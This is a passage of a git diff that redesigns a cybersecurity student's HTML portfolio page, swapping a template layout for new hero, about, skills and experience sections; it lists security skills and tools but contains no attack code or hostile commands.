+    [data-theme="dark"] .ms{background:var(--accent);color:#000;border-color:var(--accent);}
+    .ms:hover{opacity:.8;}
+
+    /* ── MOBILE ── */
+    @media(max-width:860px){
+      .hero-inner{flex-direction:column-reverse;gap:2.5rem;}
+      .hero-photo-wrap{width:min(200px,58vw);margin:0 auto;}
+      .hero-social{display:none;}
+      .nav-links{display:none;}
+      .about-grid,.edu-grid,.contact-grid{grid-template-columns:1fr;gap:2.5rem;}
+      section{padding:4.5rem 1.5rem;}
+      .blog-entry{grid-template-columns:1fr;gap:.4rem;}
+      .be-arr{display:none;}
+      .mrow{grid-template-columns:1fr;}
+    }
+  </style>
 </head>
+<body>
 
-<body class="index-page">
+<!-- glitch layers -->
+<canvas id="gc"></canvas>
+<div id="grgb"></div>
+<div id="gscan"></div>
 
-  <header id="header" class="header dark-background d-flex flex-column">
-    <i class="header-toggle d-xl-none bi bi-list"></i>
+<!-- cursor -->
+<div class="cur-dot" id="cDot"></div>
+<div class="cur-ring" id="cRing"></div>
 
-    <div class="profile-img">
-      <img src="assets/img/portfolio-profile.png" alt="" class="img-fluid rounded-circle">
+<!-- NAV -->
+<nav>
+  <div class="nav-in">
+    <a href="#" class="nav-logo" onclick="showPage('main');return false;">CN<span>.</span></a>
+    <ul class="nav-links">
+      <li><a href="#about" onclick="showPage('main')">About</a></li>
+      <li><a href="#skills" onclick="showPage('main')">Skills</a></li>
+      <li><a href="#experience" onclick="showPage('main')">Experience</a></li>
+      <li><a href="#projects" onclick="showPage('main')">Projects</a></li>
+      <li><a href="#" onclick="showPage('ctf');return false;">CTF Writeups</a></li>
+      <li><a href="#education" onclick="showPage('main')">Education</a></li>
+      <li><a href="#contact" onclick="showPage('main')">Contact</a></li>
+    </ul>
+    <div class="tog-wrap">
+      <span class="tog-lbl" id="togLbl">Light</span>
+      <button class="tog" id="togBtn" aria-label="Toggle theme"></button>
     </div>
+  </div>
+</nav>
 
-    <a href="index.html" class="logo d-flex align-items-center justify-content-center">
-      <!-- Uncomment the line below if you also wish to use an image logo -->
-      <!-- <img src="assets/img/logo.png" alt=""> -->
-      <h1 class="sitename">Castro Nicholas</h1>
-    </a>
+<!-- ════════════════════════════════════════
+     MAIN PAGE
+════════════════════════════════════════ -->
+<div id="page-main" class="page active">
 
-    <div class="social-links text-center">
-      <a href="https://x.com/cycle_script" class="twitter" target="_blank" rel="noopener noreferrer" aria-label="Follow me on X"><i class="bi bi-twitter-x"></i></a>
-      <!-- <a href="#" class="facebook"><i class="bi bi-facebook"></i></a> -->
-      <!-- <a href="#" class="instagram"><i class="bi bi-instagram"></i></a> -->
-      <!-- <a href="#" class="google-plus"><i class="bi bi-skype"></i></a> -->
-      <a href="https://www.linkedin.com/in/castro-nicholas/" class="linkedin"><i class="bi bi-linkedin" target="_blank" rel="noopener noreferrer" aria-label="My Linkedin profile"></i></a>
-    </div>
-
-     <nav id="navmenu" class="navmenu">
-      <ul>
-        <li><a href="https://cycle-script.github.io/portfolio/" class="active" ><i class="bi bi-house navicon"></i>Home</a></li>
-        <li><a href="https://cycle-script.github.io/portfolio/#about"><i class="bi bi-person navicon"></i> About</a></li>
-        <li><a href="https://cycle-script.github.io/portfolio/#resume"><i class="bi bi-file-earmark-text navicon"></i> Resume</a></li>
-        <li><a href="https://cycle-script.github.io/portfolio/#portfolio"><i class="bi bi-images navicon"></i> Portfolio</a></li>
-        
-        <!--
-
-        <li><a href="https://cycle-script.github.io/portfolio/#services"><i class="bi bi-hdd-stack navicon"></i> Services</a></li>
-
-	 =======================Dropdown if needed ===================================
-	==================================================================================
-	   <li class="dropdown"><a href="#"><i class="bi bi-menu-button navicon"></i> <span>Dropdown</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
-          <ul>
-            <li><a href="#">Dropdown 1</a></li>
-            <li class="dropdown"><a href="#"><span>Deep Dropdown</span> <i class="bi bi-chevron-down toggle-dropdown"></i></a>
-              <ul>
-                <li><a href="#">Deep Dropdown 1</a></li>
-                <li><a href="#">Deep Dropdown 2</a></li>
-                <li><a href="#">Deep Dropdown 3</a></li>
-                <li><a href="#">Deep Dropdown 4</a></li>
-                <li><a href="#">Deep Dropdown 5</a></li>
-              </ul>
-            </li>
-            <li><a href="#">Dropdown 2</a></li>
-            <li><a href="#">Dropdown 3</a></li>
-            <li><a href="#">Dropdown 4</a></li>
-          </ul>
-        </li>
-		===============================================================================
-		
-        <li><a href="#contact"><i class="bi bi-envelope navicon"></i> Contact</a></li>
-        -->
-
-        <li><a href="#testimonials"><i class="bi bi-chat-dots-fill navicon"></i> Testimonials</a></li>
-      </ul>
-    </nav>
-
-  </header>
-
-  <main class="main">
-
-    <!-- Hero Section -->
-    <section id="hero" class="hero section dark-background">
-
-      <img src="assets/img/bg.png" alt="" data-aos="fade-in" class="">
-
-      <div class="container" data-aos="fade-up" data-aos-delay="100">
-        <h2>Castro Nicholas</h2>
-        <p>I am a passionate <span class="typed" data-typed-items="CTF-Player,Offensive Security Practitioner, Jr Penetration Tester,Graphics Designer, CyberSecurity Enthusiast, Ethical Hacker in Training, White-hacker in the making, "> Ethical Hacker in Training</span><span class="typed-cursor typed-cursor--blink" aria-hidden="true"></span><span class="typed-cursor typed-cursor--blink" aria-hidden="true"></span></p>
+  <!-- HERO -->
+  <section id="hero">
+    <div class="hero-inner">
+      <div class="hero-content">
+        <div class="hero-eyebrow">Cybersecurity Professional &amp; Penetration Tester</div>
+        <h1 class="hero-name">CASTRO<span class="ln2">NICHOLAS</span></h1>
+        <p class="hero-tagline" id="hTag"></p>
+        <div class="hero-meta">
+          <span class="hero-loc">📍 Kampala, Uganda</span>
+          <span class="hdot"></span>
+          <span class="hero-loc">BSc Networking &amp; Cybersecurity</span>
+          <span class="hdot"></span>
+          <span class="hero-loc">ISC2 Certified</span>
+        </div>
+        <div class="hero-ctas">
+          <a href="#projects" class="btn-p">View Projects</a>
+          <a href="#contact" class="btn-s">Get in Touch</a>
+        </div>
       </div>
 
-    </section><!-- /Hero Section -->
-
-    <!-- About Section -->
-    <section id="about" class="about section">
-
-      <!-- Section Title -->
-      <div class="container section-title" data-aos="fade-up">
-        <h2>About</h2>
-        <p>
-	I'm a third-year cybersecurity student with a passion for understanding systems from both sides of the digital battlefield. My philosophy is simple: to build better defenses, you need to think like an attacker.
-	My hands-on learning journey spans multiple platforms including 
-	<span class="platform">PortSwigger Academy</span>, 
-	<span class="platform">PicoCTF</span>, 
-	<span class="platform">TryHackMe</span>, and 
-	<span class="platform">Hack The Box</span> 
-	where I continuously sharpen my skills in web application security, network penetration testing, and vulnerability analysis. Each challenge I solve adds another tool to my defensive arsenal and deepens my understanding of real-world security threats.
-	Beyond personal growth, I'm committed to strengthening Africa's cybersecurity landscape as an active contributor to Uganda's Uguntu Hacking Community. I believe in the power of knowledge sharing and collaborative learning to elevate our collective security posture.
-	
-		</p>
-		
-      </div><!-- End Section Title -->
-
-      <div class="container" data-aos="fade-up" data-aos-delay="100">
-
-        <div class="row gy-4 justify-content-center">
-          <div class="col-lg-4">
-            <img src="assets/img/my-profile-img1.png" class="img-fluid" alt="">
-          </div>
-          <div class="col-lg-8 content">
-            <h2>Penetration Tester | CyberSec Ninja &amp; Graphics Designer.</h2>
-            <p class="fst-italic py-3">
-              Aspiring Cybersecurity Pro | 3rd-Year Student Mastering the Art of Defense by offense 😉🛡️ | Conquering PortSwigger Labs, PicoCTF, TryHackMe & Hack The Box Challenges | Passionate Contributor to Uganda's Uguntu Hacking Community | Building a Secure Digital Future, One Hack at a Time!
-            </p>
-            <div class="row">
-              <div class="col-lg-6">
-                <ul>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Birthday:</strong> <span>09 September 2002</span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Website:</strong> <span>https://cycle-script.github.io/portfolio/</span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Phone:</strong> <span><a href="tel:256700305819">+256 700 305819</a></span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>City:</strong> <span>Kampala, UG</span></li>
-                </ul>
-              </div>
-              <div class="col-lg-6">
-                <ul>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Age:</strong> <span id="age"></span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Degree:</strong> <span>Bachelors</span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Email:</strong> <span><a href='mailto:castronicholas2002@gmail.com'>Email Me!</a></span></li>
-                  <li><i class="bi bi-chevron-right"></i> <strong>Freelance:</strong> <span>Available</span></li>
-                </ul>
-              </div>
-            </div>
-            <p class="py-3">
-              I have had the honors of participating in different CyberSecurity competitions like PicoCTF, HTB CTF,Cyberstars 3rd Edition - UCC and many more which have greatly contributed in the honing of my skills. 
-            </p>
+      <!-- PHOTO SLOT -->
+      <div class="hero-photo-wrap" data-label="Castro Nicholas">
+        <div class="hero-photo-frame">
+          <!--
+            TO ADD YOUR PHOTO:
+            Replace the <div class="photo-placeholder">...</div> block below with:
+            <img src="photo.jpg" alt="Castro Nicholas" />
+            Put your photo file in the same folder as this index.html
+          -->
+          <div class="photo-placeholder">
+            <svg width="52" height="52" viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="26" cy="18" r="10" stroke="currentColor" stroke-width="1.5"/>
+              <path d="M4 48c0-12.15 9.85-22 22-22s22 9.85 22 22" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>
+            <span>Add your photo — see HTML comment above</span>
           </div>
         </div>
-
-      </div>
-
-    </section><!-- /About Section -->
-	
-	
-
-    <!-- Stats Section --
-    <section id="stats" class="stats section">
-
-      <div class="container" data-aos="fade-up" data-aos-delay="100">
-
-        <div class="row gy-4">
-
-          <div class="col-lg-3 col-md-6">
-            <div class="stats-item">
-              <i class="bi bi-emoji-smile"></i>
-              <span data-purecounter-start="0" data-purecounter-end="232" data-purecounter-duration="1" class="purecounter"></span>
-              <p><strong>Happy Clients</strong> <span>consequuntur quae</span></p>
-            </div>
-          </div><!-- End Stats Item --
-
-          <div class="col-lg-3 col-md-6">
-            <div class="stats-item">
-              <i class="bi bi-journal-richtext"></i>
-              <span data-purecounter-start="0" data-purecounter-end="521" data-purecounter-duration="1" class="purecounter"></span>
-              <p><strong>Projects</strong> <span>adipisci atque cum quia aut</span></p>
-            </div>
-          </div><!-- End Stats Item --
-
-          <div class="col-lg-3 col-md-6">
-            <div class="stats-item">
-              <i class="bi bi-headset"></i>
-              <span data-purecounter-start="0" data-purecounter-end="1453" data-purecounter-duration="1" class="purecounter"></span>
-              <p><strong>Hours Of Support</strong> <span>aut commodi quaerat</span></p>
-            </div>
-          </div><!-- End Stats Item --
-
-          <div class="col-lg-3 col-md-6">
-            <div class="stats-item">
-              <i class="bi bi-people"></i>
-              <span data-purecounter-start="0" data-purecounter-end="32" data-purecounter-duration="1" class="purecounter"></span>
-              <p><strong>Hard Workers</strong> <span>rerum asperiores dolor</span></p>
-            </div>
-          </div><!-- End Stats Item --
-
-        </div>
-
-      </div>
-
-    </section> -- /Stats Section -->
-
-    <!-- Skills Section -->
-    <section id="skills" class="skills section light-background">
-
-      <!-- Section Title -->
-      <div class="container section-title" data-aos="fade-up">
-        <h2>Technical arsenal</h2>
-        <p>Core competencies and technologies powering my cybersecurity journey</p>
-      </div><!-- End Section Title -->
-
-      <div class="container" data-aos="fade-up" data-aos-delay="100">
-
-        <div class="row skills-content skills-animation">
-
-			<span class="skill-badge">Photoshop</span>
-			<span class="skill-badge">Python</span>
-			<span class="skill-badge">Linux</span>
-			<span class="skill-badge">Network Security</span>
-			<span class="skill-badge">Penetration Testing</span>
-		  
-			<span class="skill-badge">System auditing</span>
-			<span class="skill-badge">Capture the Flag</span>
-			<span class="skill-badge">SIEMs</span>
-			<span class="skill-badge">PHP</span>
-			<span class="skill-badge">WordPress/CMS</span>            
-
-          
-			
-
-            
-           <!-- End Skills Item -->
-
-          </div>
-
-        </div>
-
-      </div>
-
-    </section><!-- /Skills Section -->
-
-    <!-- Resume Section -->
-    <section id="resume" class="resume section">
-
-      <!-- Section Title -->
-      <div class="container section-title" data-aos="fade-up">
-        <h2>Resume</h2>
-        <p>Aspiring cybersecurity professional with practical experience in offensive security and network defense. Combining academic knowledge with hands-on training from leading security platforms to develop comprehensive understanding of modern threats and countermeasures.</p>
-      </div><!-- End Section Title -->
-
-      <div class="container">
-
-        <div class="row">
-
-          <div class="col-lg-6" data-aos="fade-up" data-aos-delay="100">
-            <h3 class="resume-title">Sumary</h3>
-
-            <div class="resume-item pb-0">
-              <h4>Castro Nicholas</h4>
-              <p><em>Cybersecurity student and aspiring penetration tester with offensive security training and graphic design experience. Combines technical expertise in web application security and network testing with creative problem-solving approach. Active contributor to Uganda's cybersecurity community through Uguntu Hacking Community.</em></p>
-              <ul>
-                <li>Kampala, Uganda</li>
-                <li>+256 700 305819</li>
-                <li>castronicholas2002@gmail.com</li>
-              </ul>
-            </div><!-- Edn Resume Item -->
-
-            <h3 class="resume-title">Education</h3>
-            <div class="resume-item">
-              <h4>Bachelor of Science in Networking  &amp; CyberSecurity</h4>
-              <h5>2023 - 2026</h5>
-              <p><em>ISBAT University, UG</em></p>
-              <p>Third-year cybersecurity student developing comprehensive defensive skills through hands-on offensive security training. Currently honing practical expertise in web application security, network penetration testing, and vulnerability analysis through various platforms as mention <a href="#about">above.</a></p>
-            </div><!-- Edn Resume Item -->
-			
-			<div class="resume-item">
-              <h4>Certified in Cyber - ISC2</h4>
-              <h5>2025</h5>
-              <p><em>ISC2, Online</em></p>
-              <p>Earned entry-level cybersecurity certification demonstrating foundational knowledge in security principles, risk management, network security, and incident response. This globally recognized credential validates understanding of core cybersecurity concepts and commitment to professional development in the field. More of my ceritications and certificates can be found on my <a href="https://www.linkedin.com/in/castro-nicholas/details/certifications/" target="_blank" rel="noopener noreferrer">Linkedin Profile.</a></p>
-            </div><!-- Edn Resume Item -->
-
-            <div class="resume-item">
-              <h4>UACE</h4>
-              <h5>2017 - 2019</h5>
-              <p><em>St Jonah High School Namugongo, UG</em></p>
-              <p>I pursued and competed my highschool from St. Jonah High School where I attained my UACE certificate.</p>
-            </div><!-- Edn Resume Item -->
-
-          </div>
-
-          <div class="col-lg-6" data-aos="fade-up" data-aos-delay="200">
-            <h3 class="resume-title">Professional Experience</h3>
-            <div class="resume-item">
-              <h4>Firewall installtion &amp; network redesign</h4>
-              <h5>2025</h5>
-              <p><em>449 Hub, Ntinda</em></p>
-              <ul>
-                <li>Successfully deployed and configured enterprise firewall infrastructure for government organization security enhancement</li>
-    <li>Developed and implemented comprehensive security policies including access control lists and threat prevention rules</li>
-    <li>Architected and executed network segmentation strategy to isolate critical systems and reduce attack surface</li>
-    <li>Optimized network traffic flow and security posture through strategic VLAN implementation and zone-based policies</li>
-              </ul>
-            </div><!-- Edn Resume Item -->
-
-            <div class="resume-item">
-              <h4>Graphic designer</h4>
-              <h5>Freelance</h5>
-              <p><em>N/A</em></p>
-              <ul>
-                 <li>Created comprehensive branding and marketing materials for UCC Cyberstars program including posters, banners, and promotional graphics</li>
-    <li>Developed numerous design projects across various media including brochures, infographics, presentations, and digital advertisements</li>
-    <li>Managed multiple concurrent design projects while maintaining quality standards and meeting tight deadlines</li>
-    <li>Collaborated with clients to translate cybersecurity concepts into visually compelling and accessible design solutions</li>
-              </ul>
-            </div><!-- Edn Resume Item -->
-
-          </div>
-
-        </div>
-
-      </div>
-
-    </section><!-- /Resume Section -->
-
-    <!-- Portfolio Section -->
-    <section id="portfolio" class="portfolio section light-background">
-
-      <!-- Section Title -->
-      <div class="container section-title" data-aos="fade-up">
-        <h2>Portfolio</h2>
-        <p>Showcasing my graphics design work and my practical cybersecurity journey through completed challenges, security assessments, and technical projects and art work. From TryHackMe rooms, Hack The Box machines, CTF challenges to real-world network implementations, this portfolio highlights my growing expertise in offensive security and defensive strategies.</p>
-      </div><!-- End Section Title -->
-
-      <div class="container">
-
-        <div class="isotope-layout" data-default-filter="*" data-layout="masonry" data-sort="original-order">
-
-          <ul class="portfolio-filters isotope-filters" data-aos="fade-up" data-aos-delay="100">
-            <li data-filter="*" class="filter-active">All</li>
-            <li data-filter=".filter-ctf">CTF-Challenges</li>
-            <li data-filter=".filter-cyber">Cyber-Sec</li>
-			<li data-filter=".filter-graphics">Graphics</li>
-            <li data-filter=".filter-projects">Upcoming ...</li>
-          </ul><!-- End Portfolio Filters -->
-
-          <div class="row gy-4 isotope-container" data-aos="fade-up" data-aos-delay="200">
-
-            <div class="col-lg-4 col-md-6 portfolio-item isotope-item filter-graphics">
-              <div class="portfolio-content h-100">
-                <img src="assets/img/portfolio/graphics/ucc-2.png" class="img-fluid" alt="">
-                <div class="portfolio-info">
-                  <h4>Graphics Design Projects</h4>
-                  <p>Artwork for UCC | UgCert cyberstars competition</p>
-                  <a href="assets/img/portfolio/graphics/ucc-2.png" title="Graphics Art work" data-gallery="portfolio-gallery-app" class="glightbox preview-link"><i class="bi bi-zoom-in"></i></a>
-                  <a href="portfolio/graphics/portfolio-details-graphics.html" title="More Details" class="details-link"><i class="bi bi-link-45deg"></i></a>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            <div class="col-lg-4 col-md-6 portfolio-item isotope-item filter-cyber">
-              <div class="portfolio-content h-100">
-                <img src="assets/img/portfolio/cybersec/fortinet/fortinet.png" class="img-fluid" alt="">
-                <div class="portfolio-info">
-                  <h4>Fortinet Installation</h4>
-                  <p>449 Hub</p>
-                  <a href="assets/img/portfolio/cybersec/fortinet/fortinet.png" title="Firewall Configuration" data-gallery="portfolio-gallery-product" class="glightbox preview-link"><i class="bi bi-zoom-in"></i></a>
-                  <a href="portfolio/cyber/portfolio-details-fortinet.html" title="More Details" class="details-link"><i class="bi bi-link-45deg"></i></a>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-
-            <div class="col-lg-4 col-md-6 portfolio-item isotope-item filter-ctf">
-              <div class="portfolio-content h-100">
-                <img src="assets/img/portfolio/ctf/cyberstars/cyberstars-ctf.jpg" class="img-fluid" alt="">
-                <div class="portfolio-info">
-                  <h4>UCC Cyberstars 2025</h4>
-                  <p>Organized for all univeristies at national level</p>
-                  <a href="assets/img/ctf/cyberstars/cyberstars-ctf.jpg" title="CTF Challenges" data-gallery="portfolio-gallery-branding" class="glightbox preview-link"><i class="bi bi-zoom-in"></i></a>
-                  <a href="portfolio/ctf/portfolio-details-cyberstars.html" title="More Details" class="details-link"><i class="bi bi-link-45deg"></i></a>
-                </div>
-              </div>
-            </div><!-- End Portfolio Item -->
-
-            
-            </div><!-- End Portfolio Item -->
-
-          </div><!-- End Portfolio Container -->
-
-        </div>
-
-      </div>
-
-    </section><!-- /Portfolio Section -->
-
-    <!-- Services Section --
-    <section id="services" class="services section">
-
-      <!-- Section Title --
-      <div class="container section-title" data-aos="fade-up">
-        <h2>Services</h2>
-        <p>#</p>
-      </div><!-- End Section Title --
-
-      <div class="container">
-
-        <div class="row gy-4">
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="100">
-            <div class="icon flex-shrink-0"><i class="bi bi-briefcase"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Lorem Ipsum</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div>
-          <!-- End Service Item --
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="200">
-            <div class="icon flex-shrink-0"><i class="bi bi-card-checklist"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Dolor Sitema</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div><!-- End Service Item --
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="300">
-            <div class="icon flex-shrink-0"><i class="bi bi-bar-chart"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Sed ut perspiciatis</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div><!-- End Service Item --
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="400">
-            <div class="icon flex-shrink-0"><i class="bi bi-binoculars"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Magni Dolores</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div><!-- End Service Item --
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="500">
-            <div class="icon flex-shrink-0"><i class="bi bi-brightness-high"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Nemo Enim</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div><!-- End Service Item --
-
-          <div class="col-lg-4 col-md-6 service-item d-flex" data-aos="fade-up" data-aos-delay="600">
-            <div class="icon flex-shrink-0"><i class="bi bi-calendar4-week"></i></div>
-            <div>
-              <h4 class="title"><a href="service-details.html" class="stretched-link">Eiusmod Tempor</a></h4>
-              <p class="description">#</p>
-            </div>
-          </div><!-- End Service Item --
-
-        </div>
-
-      </div>
-
-    </section><!-- /Services Section -->
-
-    <!-- Testimonials Section -->
-    <section id="testimonials" class="testimonials section light-background">
-
-      <!-- Section Title -->
-      <div class="container section-title" data-aos="fade-up">
-        <h2>Testimonials</h2>
-        <p>Recognition from peers and mentors in the cybersecurity field regarding my hands-on technical abilities, problem-solving approach, and contributions to security projects.</p>
-      </div><!-- End Section Title -->
-
-      <div class="container" data-aos="fade-up" data-aos-delay="100">
-
-        <div class="swiper init-swiper">
-          <script type="application/json" class="swiper-config">
-            {
-              "loop": true,
-              "speed": 600,
-              "autoplay": {
-                "delay": 5000
-              },
-              "slidesPerView": "auto",
-              "pagination": {
-                "el": ".swiper-pagination",
-                "type": "bullets",
-                "clickable": true
-              },
-              "breakpoints": {
-                "320": {
-                  "slidesPerView": 1,
-                  "spaceBetween": 40
-                },
-                "1200": {
-                  "slidesPerView": 3,
-                  "spaceBetween": 1
-                }
-              }
-            }
-          </script>
-          <div class="swiper-wrapper">
-
-            <div class="swiper-slide">
-              <div class="testimonial-item">
-                <p>
-                  <i class="bi bi-quote quote-icon-left"></i>
-                  <span>#</span>
-                  <i class="bi bi-quote quote-icon-right"></i>
-                </p>
-                <img src="assets/img/testimonials/joel.avif" class="testimonial-img" alt="">
-                <h3>Ug_Pwn</h3>
-                <h4>Penetration Tester &amp; SOC analyst</h4>
-              </div>
-            </div><!-- End testimonial item -->
-
-            <div class="swiper-slide">
-              <div class="testimonial-item">
-                <p>
-                  <i class="bi bi-quote quote-icon-left"></i>
-                  <span>#</span>
-                  <i class="bi bi-quote quote-icon-right"></i>
-                </p>
-                <img src="assets/img/testimonials/male.jpeg" class="testimonial-img" alt="">
-                <h3>Male Henry Kenneth</h3>
-                <h4>Cloud engineer &amp; Lecturer </h4>
-              </div>
-            </div><!-- End testimonial item -->
-
-            <div class="swiper-slide">
-              <div class="testimonial-item">
-                <p>
-                  <i class="bi bi-quote quote-icon-left"></i>
-                  <span>#</span>
-                  <i class="bi bi-quote quote-icon-right"></i>
-                </p>
-                <img src="assets/img/testimonials/leticia.jpeg" class="testimonial-img" alt="">
-                <h3>Leticia Lydia</h3>
-                <h4>Graphics Designer &amp; Data Scientist</h4>
-              </div>
-            </div><!-- End testimonial item -->
-
-            
-
-          </div>
-          <div class="swiper-pagination"></div>
-        </div>
-
-      </div>
-
-    </section><!-- /Testimonials Section -->
-
-    
-
-  </main>
-
-  <footer id="footer" class="footer position-relative light-background">
-
-    <div class="container">
-      <div class="copyright text-center ">
-        <p>© <span>Copyright</span> <strong class="px-1 sitename">Nicholas Castro</strong> <span>All Rights Reserved</span></p>
-      </div>
-      <div class="credits">
-        <!-- All the links in the footer should remain intact. -->
-        <!-- You can delete the links only if you've purchased the pro version. -->
-        <!-- Licensing information: https://bootstrapmade.com/license/ -->
-        <!-- Purchase the pro version with working PHP/AJAX contact form: [buy-url] -->
-        Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
       </div>
     </div>
 
+    <div class="hero-social">
+      <a href="https://github.com/cycle-script" target="_blank">GitHub</a>
+      <a href="https://www.linkedin.com/in/castro-nicholas" target="_blank">LinkedIn</a>
+      <a href="https://x.com/cycle_script" target="_blank">Twitter</a>
+    </div>
+  </section>
+
+  <!-- ABOUT -->
+  <section id="about">
+    <div class="sec-lbl">01 — About</div>
+    <h2>WHO I AM</h2>
+    <div class="about-grid">
+      <div class="about-text fu">
+        <p>I'm <strong>Castro Nicholas</strong>, a final-year Cybersecurity student at ISBAT University and an aspiring penetration tester with a strong focus on offensive security.</p>
+        <p>I combine deep technical expertise in <strong>web application security</strong>, <strong>network penetration testing</strong>, and <strong>vulnerability analysis</strong> with a creative problem-solving approach shaped by my background in graphic design.</p>
+        <p>I'm an active contributor to Uganda's cybersecurity community through the <strong>Uguntu Hacking Community</strong>, collaborating with fellow security professionals to grow the local ecosystem.</p>
+        <p>When I'm not breaking things ethically, I'm building tools, competing in CTF competitions, or hardening enterprise networks.</p>
+      </div>
+      <div class="about-details fu">
+        <div class="d-item"><span class="d-icon">[LOC]</span><div class="d-text"><strong>Location</strong>Kampala, Uganda</div></div>
+        <div class="d-item"><span class="d-icon">[EDU]</span><div class="d-text"><strong>Education</strong>BSc Networking &amp; Cybersecurity · ISBAT University · 2023–2026</div></div>
+        <div class="d-item"><span class="d-icon">[CERT]</span><div class="d-text"><strong>Certified in Cyber</strong>ISC2 · 2025</div></div>
+        <div class="d-item"><span class="d-icon">[COMM]</span><div class="d-text"><strong>Community</strong>Uguntu Hacking Community · Active Contributor</div></div>
+        <div class="d-item"><span class="d-icon">[MAIL]</span><div class="d-text"><strong>Email</strong>castronicholas2002@gmail.com</div></div>
+        <div class="d-item"><span class="d-icon">[TEL]</span><div class="d-text"><strong>Phone</strong>+256 700 305819</div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SKILLS -->
+  <section id="skills">
+    <div class="si">
+      <div class="sec-lbl">02 — Skills</div>
+      <h2>TECHNICAL ARSENAL</h2>
+      <div class="skills-grid">
+        <div class="skill-cat fu">
+          <div class="sct">Offensive Security</div>
+          <div class="sk-row"><span class="sk-name">Web App Pentesting</span><div class="sk-bw"><div class="sk-b" data-w="88"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Network Pentesting</span><div class="sk-bw"><div class="sk-b" data-w="82"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Vulnerability Analysis</span><div class="sk-bw"><div class="sk-b" data-w="85"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Binary Exploitation</span><div class="sk-bw"><div class="sk-b" data-w="70"></div></div></div>
+        </div>
+        <div class="skill-cat fu">
+          <div class="sct">Tools &amp; Platforms</div>
+          <div class="sk-row"><span class="sk-name">Burp Suite</span><div class="sk-bw"><div class="sk-b" data-w="90"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Nmap / Nessus</span><div class="sk-bw"><div class="sk-b" data-w="88"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Metasploit</span><div class="sk-bw"><div class="sk-b" data-w="80"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Wireshark</span><div class="sk-bw"><div class="sk-b" data-w="83"></div></div></div>
+        </div>
+        <div class="skill-cat fu">
+          <div class="sct">Network &amp; Infrastructure</div>
+          <div class="sk-row"><span class="sk-name">Fortinet / FortiGate</span><div class="sk-bw"><div class="sk-b" data-w="85"></div></div></div>
+          <div class="sk-row"><span class="sk-name">VLAN / SD-WAN</span><div class="sk-bw"><div class="sk-b" data-w="80"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Firewall Policy Design</span><div class="sk-bw"><div class="sk-b" data-w="88"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Network Segmentation</span><div class="sk-bw"><div class="sk-b" data-w="82"></div></div></div>
+        </div>
+        <div class="skill-cat fu">
+          <div class="sct">Development</div>
+          <div class="sk-row"><span class="sk-name">Python</span><div class="sk-bw"><div class="sk-b" data-w="85"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Flask / REST APIs</span><div class="sk-bw"><div class="sk-b" data-w="75"></div></div></div>
+          <div class="sk-row"><span class="sk-name">JavaScript / D3.js</span><div class="sk-bw"><div class="sk-b" data-w="68"></div></div></div>
+          <div class="sk-row"><span class="sk-name">Linux / Kali</span><div class="sk-bw"><div class="sk-b" data-w="90"></div></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- EXPERIENCE -->
+  <section id="experience">
+    <div class="sec-lbl">03 — Experience</div>
+    <h2>FIELD WORK</h2>
+    <div class="tl">
+      <div class="tl-item fu">
+        <div class="tl-date">2025</div>
+        <div class="tl-title">Firewall Installation &amp; Network Redesign</div>
+        <div class="tl-org">449 Hub, Ntinda</div>
+        <ul class="tl-list">
+          <li>Deployed and configured enterprise firewall infrastructure for a government organization.</li>
+          <li>Developed comprehensive security policies including ACLs and threat prevention rules.</li>
+          <li>Architected network segmentation strategy to isolate critical systems and reduce attack surface.</li>
+          <li>Optimized traffic flow and security posture via strategic VLAN implementation and zone-based policies.</li>
+        </ul>
+      </div>
+      <div class="tl-item fu">
+        <div class="tl-date">2023 – Present</div>
+        <div class="tl-title">Cybersecurity Community Contributor</div>
+        <div class="tl-org">Uguntu Hacking Community, Uganda</div>
+        <div class="tl-desc">Active contributor to Uganda's growing cybersecurity ecosystem — CTF competitions, knowledge sharing, and community-driven security awareness.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PROJECTS -->
+  <section id="projects">
+    <div class="si">
+      <div class="sec-lbl">04 — Projects</div>
+      <h2>BUILT THINGS</h2>
+      <div class="proj-grid">
+        <div class="proj-card fu">
+          <div class="proj-idx">Project / 001</div>
